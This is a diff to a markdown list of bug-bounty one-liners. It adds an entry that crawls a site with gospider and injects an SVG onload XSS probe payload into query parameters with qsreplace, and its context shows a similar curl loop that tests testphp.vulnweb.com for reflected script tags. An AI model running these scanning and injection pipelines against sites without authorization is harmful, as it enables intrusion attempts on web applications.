@@ -68,6 +68,12 @@ echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -thr
 waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
 
+## XSS qsreplace
+> @KingOfBugBounty
+```
+gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
+```
+
 ## Dump In-Scope Assests from Bounty Program
 ### BugCrowd Programs
 > @dwisiswant0
